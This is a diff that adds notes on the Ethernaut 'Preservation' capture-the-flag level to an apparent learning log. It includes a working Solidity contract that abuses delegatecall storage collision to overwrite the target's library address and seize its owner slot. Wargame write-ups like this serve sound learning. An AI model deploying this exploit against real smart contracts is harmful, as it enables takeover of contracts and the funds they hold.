@@ -32,6 +32,31 @@ constructor() {
 
 Naught Coin - Just needed to use `approve()` and `transferFrom()` ERC20 methods.
 
+Preservation - What I thought was Delegation all over again was riddle with bugs somehow. I don't know what happened. It worked in the end somehow. 
+
+```
+contract PreservationSolution {
+    // public library contracts 
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner; 
+    uint storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    Preservation preservation = Preservation(0xe208Cb45150Ce7d28ebE2B3643ab004Ebf08eFe3);
+
+    function attack() public {
+        preservation.setFirstTime(uint(uint160(address(this))));
+        preservation.setFirstTime(1);
+    }
+
+    function setTime(uint _time) public {
+        owner = msg.sender;
+    }
+}
+```
+
 ---
 
 ### 1/6/2023 Ethernaut #3
